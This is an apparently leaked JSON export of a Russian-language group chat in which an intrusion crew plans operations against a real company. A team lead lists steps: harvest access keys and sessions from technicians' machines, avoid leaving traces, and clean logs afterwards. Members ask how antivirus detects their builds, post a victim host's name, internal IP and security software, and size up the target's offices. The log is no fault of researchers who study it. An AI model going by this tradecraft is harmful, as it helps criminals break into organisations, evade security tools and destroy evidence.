+      "_id": "6EdsEPZqBad5JFfw2",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "ITCMA-FILE01\n10.0.0.39\n```\n  DisplayName                    : Malwarebytes Anti-Malware version 1.80.2.1012\n  DisplayVersion                 : 1.80.2.1012\n  Publisher                      : Malwarebytes Corporation\n  InstallDate                    : 6/13/2019 12:00:00 AM\n  Architecture                   : x86\n\n\n  DisplayName                    : Malwarebytes Anti-Exploit version 1.13.2.283\n  DisplayVersion                 : 1.13.2.283\n  Publisher                      : Malwarebytes\n  InstallDate                    : 10/13/2020 12:00:00 AM\n  Architecture                   : x64\n```",
+      "ts": "2020-10-21T00:25:45.088Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T00:29:47.486Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-21T00:29:47.482Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "Zzn6WyJGfZMt9Qe4g",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "да вроде, как раз наоборот",
+      "ts": "2020-10-21T00:24:47.713Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T00:24:47.734Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6f7xQtuCE7FuqtkE4",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "когда? всегда же отключали",
+      "ts": "2020-10-21T00:24:23.780Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:24:23.816Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pDoS9QMFrdBHYwHHk",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "посто маккафи как то же пропускал?",
+      "ts": "2020-10-21T00:23:58.501Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T00:23:58.537Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rZ2K779zDfoBNJeei",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "он скорее всего на динамике поймает",
+      "ts": "2020-10-21T00:23:46.866Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:23:46.909Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3rmATRaXQohKjysFz",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "в частности, сейчас интересует малварьбайтс",
+      "ts": "2020-10-21T00:23:20.881Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T00:23:20.917Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4ceekowEWe9yC4b4f",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "достаточно плохо",
+      "ts": "2020-10-21T00:23:14.271Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:23:14.309Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "N6ud2DiptT3xnhFSJ",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "@tl1 у нас есть статистика, как антивирусы относятся к нашим билдам?",
+      "ts": "2020-10-21T00:22:38.285Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T00:22:38.331Z",
+      "mentions": [
+        {
+          "_id": "yJcaRFnKQqepiffHq",
+          "username": "tl1",
+          "name": "Team Lead 1"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "4RLwPMbymn46azWym",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "[ ](https://mediaeveryone.com/group/itc-us-com?msg=gTtYwkRBNwjyaHSSC) по поводу билда под линь вопрос, надо будет уточнить",
+      "ts": "2020-10-21T00:20:36.458Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:20:36.516Z",
+      "attachments": [
+        {
+          "text": "[ ](https://mediaeveryone.com/group/itc-us-com?msg=czuBckXKb3N4dFcyd) Это что касается доступа, а как мы поступаем непосредственно внутри системы? У нас есть билды под линукс?",
+          "author_name": "user1",
+          "author_icon": "/avatar/user1",
+          "message_link": "https://mediaeveryone.com/group/itc-us-com?msg=gTtYwkRBNwjyaHSSC",
+          "attachments": [
+            {
+              "text": "1) так же ищем доступы, ключи, сессии в эти системы с тачек технарей\n2) проверяем доступы и не оставляем следов\n3) смотрим что нам нужно\n4) чистим логи за собой",
+              "author_name": "tl1",
+              "author_icon": "/avatar/tl1",
+              "message_link": "https://mediaeveryone.com/group/itc-us-com?msg=czuBckXKb3N4dFcyd",
+              "ts": "2020-10-21T00:18:15.753Z"
+            }
+          ],
+          "ts": "2020-10-21T00:19:41.982Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/itc-us-com?msg=gTtYwkRBNwjyaHSSC",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "7McLHKDY7sfXqwhj8",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "поэтому если тут все готово то ставим билд",
+      "ts": "2020-10-21T00:18:46.485Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:18:46.523Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "FmPWQQuiwd3uy8L4f",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "> В итоге, что сделано - то сделано.\nда, я просто не хочу чтобы и тут потом были обсуждения на эту тему",
+      "ts": "2020-10-21T00:18:33.963Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:18:33.999Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "czuBckXKb3N4dFcyd",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "1) так же ищем доступы, ключи, сессии в эти системы с тачек технарей\n2) проверяем доступы и не оставляем следов\n3) смотрим что нам нужно\n4) чистим логи за собой",
+      "ts": "2020-10-21T00:18:15.753Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:18:15.796Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "osJzmtTxuTiBrHqAr",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "если мы говорим о работе с linux",
+      "ts": "2020-10-21T00:14:08.459Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:14:08.494Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KrZW5Rcywaso5ucbK",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "ssh",
+      "ts": "2020-10-21T00:13:57.456Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:13:57.493Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "b7Ef8X98TLHEbtohy",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "ну средства управление через схх не требуют браузер",
+      "ts": "2020-10-21T00:13:04.395Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:13:04.429Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2dXWJPNxJPTFZ5tzu",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "А если бы этого не сдлелали то бы и не узнали НИКОГДА",
+      "ts": "2020-10-21T00:12:49.274Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T00:12:49.319Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Np3pQjQ79CPF2wHuH",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "Вот и все",
+      "ts": "2020-10-21T00:12:31.644Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T00:12:31.677Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jwaoJ5xyjaJHvXtG7",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "Тут авторизовали блять просто так и посмотри что есть",
+      "ts": "2020-10-21T00:12:27.332Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T00:12:27.374Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XD4Wwjs7yZzg4xkiK",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "По тому что мы не смотрим истории всех браузеров и не авторизовываемся в ЛК",
+      "ts": "2020-10-21T00:12:01.832Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T00:12:01.876Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "sHNRiMk79zcjcJnXs",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "почему*",
+      "ts": "2020-10-21T00:11:35.370Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:11:35.403Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zeM6TxbGRe9Gaiiv7",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "Браузер админа)",
+      "ts": "2020-10-21T00:11:33.779Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T00:11:33.825Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "dsfY42T4hNwi6H3Bu",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "что не проверили?",
+      "ts": "2020-10-21T00:11:17.618Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:11:17.678Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "o956HZiSMt24pLJoK",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "Это бы и не проврели)))",
+      "ts": "2020-10-21T00:10:58.249Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T00:10:58.285Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "aKP4AAc7BCFCQZSen",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "суть в том что из за того что поторопились и не проверили это останется загадкой",
+      "ts": "2020-10-21T00:10:35.649Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:10:35.680Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pcWubyBW8cFtNnMaQ",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "50 на 50 это пальцем в небо",
+      "ts": "2020-10-21T00:10:32.563Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T00:10:32.604Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "5fe8r6q7GrSSnrfeg",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "50/50",
+      "ts": "2020-10-21T00:10:11.857Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:10:11.905Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GKjG2XZbpFSPF7qy9",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "могли вполне",
+      "ts": "2020-10-21T00:10:08.228Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:10:08.270Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "bLLwSJMZPmNgEDKsC",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\nо том что в организации могли быть ключевые узлы в тех доменах?\n``` \nМогли не быть ключевые узлы в тех доменах?",
+      "ts": "2020-10-21T00:09:52.233Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T00:09:52.305Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "tdifwtMrZoLZxaof8",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "какой диап сканили?",
+      "ts": "2020-10-21T00:09:33.007Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:09:33.042Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cv4EdWpyvMJpNga3j",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "о том что в организации могли быть ключевые узлы в тех доменах?",
+      "ts": "2020-10-21T00:07:05.758Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:07:05.796Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CxaQt6GPza8vpHKLS",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "О чем это говорит? Можешь пояснить без предположений,",
+      "ts": "2020-10-21T00:06:15.512Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T00:06:15.548Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9bRdrWuvriAPFMjW7",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "наличие еще пары доменов ни о чем не говорит?",
+      "ts": "2020-10-21T00:05:40.192Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:05:40.230Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4oGBreSEBuce9TuD5",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "не более",
+      "ts": "2020-10-21T00:05:24.250Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T00:05:24.302Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "7aWA3puNsGT6akn88",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "И это все исключительно твои догадки",
+      "ts": "2020-10-21T00:05:21.399Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T00:05:21.442Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WoKC5XHE72x8dZX37",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "На аутсорсе",
+      "ts": "2020-10-21T00:05:02.875Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T00:05:02.920Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CMTC2hRSJaLd99wbE",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "бухгалтерия yf jnencjhct",
+      "ts": "2020-10-21T00:04:25.299Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T00:04:25.325Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rkceXPJLXN5ChBGNi",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "масштаб в 20 пк?",
+      "ts": "2020-10-21T00:04:15.215Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:04:15.257Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4W7J6bcmLdJBEky48",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "бухгалтерия и офис",
+      "ts": "2020-10-21T00:04:04.324Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:04:04.401Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "wfdRXsddqGfvccz2Q",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "и если не загнулась еще то у нее как минимум есть логистка",
+      "ts": "2020-10-21T00:03:55.789Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:03:55.842Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zH2aXoqFXhcFEvYWn",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "компания существует полвека",
+      "ts": "2020-10-21T00:03:41.244Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:03:41.283Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "yx6uvJnGGnQfsp9Ge",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "http://www.pkgprod.com/our-history/",
+      "ts": "2020-10-21T00:03:16.866Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:03:16.895Z",
+      "urls": [
+        {
+          "url": "http://www.pkgprod.com/our-history/"
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
